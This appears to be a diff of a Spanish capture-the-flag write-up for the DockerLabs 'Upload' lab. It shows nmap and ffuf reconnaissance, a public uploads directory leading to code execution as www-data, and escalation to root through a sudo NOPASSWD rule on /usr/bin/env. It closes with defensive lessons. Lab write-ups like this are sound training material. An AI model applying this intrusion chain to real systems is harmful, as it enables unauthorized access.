@@ -22,7 +22,7 @@ estado: "✅ Completada"
 
 # 📤 Máquina: Upload
 
-> [!info] Información general
+> Información general
 > - **Plataforma:** DockerLabs
 > - **Dificultad:** Muy fácil
 > - **SO:** Ubuntu Linux
@@ -56,7 +56,7 @@ ping -c 4 172.17.0.2
 4 packets transmitted, 4 received, 0% packet loss
 ```
 
-> [!tip] TTL = 64 → Sistema Linux confirmado
+>  TTL = 64 → Sistema Linux confirmado
 
 ---
 
@@ -70,7 +70,7 @@ nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -oN scan -vvv 172.17.0.2
 |--------|--------|----------|------------------------------|
 | 80/tcp | open   | HTTP     | Apache httpd 2.4.52 (Ubuntu) |
 
-> [!note] Solo el puerto 80 está abierto. La página se titula **"Upload here your file"** — vector directo de ataque.
+>  Solo el puerto 80 está abierto. La página se titula **"Upload here your file"** — vector directo de ataque.
 
 ---
 
@@ -90,7 +90,7 @@ ffuf -w ~/Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-
 uploads   [Status: 200, Size: 1132]
 ```
 
-> [!success] Directorio `/uploads` descubierto — aquí se almacenan los archivos subidos y **son accesibles públicamente**.
+>  Directorio `/uploads` descubierto — aquí se almacenan los archivos subidos y **son accesibles públicamente**.
 
 ```bash
 curl -L http://172.17.0.2/uploads
@@ -162,7 +162,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@a07e665cd18f:/$
 ```
 
-> [!success] RCE obtenido como usuario **`www-data`**.
+>  RCE obtenido como usuario **`www-data`**.
 
 ---
 
@@ -179,7 +179,7 @@ User www-data may run the following commands on a07e665cd18f:
     (root) NOPASSWD: /usr/bin/env
 ```
 
-> [!note] `www-data` puede ejecutar `/usr/bin/env` como root sin contraseña. El binario `env` normalmente solo establece variables de entorno, pero con SUID podemos usarlo para lanzar una shell que herede el UID de root.
+> `www-data` puede ejecutar `/usr/bin/env` como root sin contraseña. El binario `env` normalmente solo establece variables de entorno, pero con SUID podemos usarlo para lanzar una shell que herede el UID de root.
 
 Referencia: [GTFOBins — env](https://gtfobins.org/gtfobins/env/)
 
@@ -195,7 +195,7 @@ whoami
 root
 ```
 
-> [!success] Acceso **root** obtenido.
+>  Acceso **root** obtenido.
 
 Mejoramos la terminal para interactividad completa:
 
@@ -225,7 +225,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ## 🔍 Lecciones aprendidas
 
-> [!danger] Malas prácticas identificadas
+>  Malas prácticas identificadas
 > - **Upload sin validación de tipo** — aceptar cualquier archivo subido es crítico. Debería validarse extensión, MIME type y contenido.
 > - **Directorio de uploads accesible públicamente** — los archivos subidos nunca deberían ser directamente ejecutables. Almacenar fuera del web root o usar `php.ini` para deshabilitar ejecución en ese directorio.
 > - **Permisos sudo para `env`** — `/usr/bin/env` con NOPASSWD es equivalente a acceso root directo cuando se ejecuta desde un usuario con acceso web.
